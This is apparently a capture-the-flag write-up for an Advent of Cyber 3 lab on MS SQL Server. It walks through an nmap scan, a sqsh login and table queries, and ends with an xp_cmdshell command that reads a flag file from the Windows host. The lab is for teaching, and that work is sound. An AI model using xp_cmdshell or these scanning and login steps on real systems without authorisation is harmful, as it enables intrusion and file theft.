# MS SQL

- MS SQL Server is a Relational Database Management System (RDBMS). One simple way to think of a relational database is a group of tables that have relations.

# Task 1

### nmap Enumeration

```
nmap -sV -sC -vv -T5 -p- -oA result <IP>
```

```
PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000
```

- We notice that MSSQL running on port 1433

# Task 2

- Interactive with the MSSQL Server! using ```sqsh``` (SQshelL)

	- sqsh -S <server-IP> -U <username> -P <password>

![****](/Advent%20of%20Cyber%203/Screenshots/Task11/sqsh.PNG)

# Task 3 

![****](/Advent%20of%20Cyber%203/Screenshots/Task11/q3.PNG)

```
1> SELECT * FROM reindeer.dbo.names;
2> go
```

```
 id          first                                    last                                     nickname                                
 ----------- ---------------------------------------- ---------------------------------------- ----------------------------------------
           1 Dasher                                   Dasher                                   Dasher                                  
           2 Dancer                                   Dancer                                   Dancer                                  
           3 Prancer                                  Prancer                                  Prancer                                 
           4 Vixen                                    Vixen                                    Vixen                                   
           5 Comet                                    Comet                                    Comet                                   
           6 Cupid                                    Cupid                                    Cupid                                   
           7 Donner                                   Donder                                   Dunder                                  
           8 Blitzen                                  Blixem                                   Blitzen                                 
           9 Rudolph                                  Reindeer                                 Red Nosed 
```

# Task 4


![****](/Advent%20of%20Cyber%203/Screenshots/Task11/q4.PNG)


```
1> SELECT * FROM reindeer.dbo.schedule;
2> go
```

```
 id                   date                destination                                                                      notes                                   
 -------------------- ------------------- -------------------------------------------------------------------------------- ----------------------------------------
                 2000 Dec  5 2021 12:00AM Tokyo                                                                            NULL                                    
                 2001 Dec  3 2021 12:00AM London                                                                           NULL                                    
                 2002 Dec  1 2021 12:00AM New York                                                                         NULL                                    
                 2003 Dec  2 2021 12:00AM Paris                                                                            NULL                                    
                 2004 Dec  4 2021 12:00AM California                                                                       NULL                                    
                 2005 Dec  7 2021 12:00AM Prague                                                                           NULL                                    
                 2006 Dec 11 2021 12:00AM Bangkok                                                                          NULL                                    
                 2007 Dec 10 2021 12:00AM Seoul                                                                            NULL                                    

(8 rows affected)

```

# Task 5 

![****](/Advent%20of%20Cyber%203/Screenshots/Task11/q5.PNG)

```
1> SELECT * FROM reindeer.dbo.presents;
2> go
```

```
 id          name                                                                             quantity   
 ----------- -------------------------------------------------------------------------------- -----------
         100 Blanket                                                                                  500
         101 Laptop                                                                                  1000
         102 Cooler                                                                                   250
         103 BT Speaker                                                                              1000
         104 THM Subscription                                                                      100000
         105 Alarm Clock                                                                              500
         106 Cookies                                                                                10000
         107 THM T-Shirt                                                                           100000
         108 Power Bank                                                                             25000
         109 USB Hub                                                                                15000
````

# Task 6

![****](/Advent%20of%20Cyber%203/Screenshots/Task11/q6.PNG)


```
1> xp_cmdshell'type C:\Users\grinch\Documents\flag.txt';
2> go
```

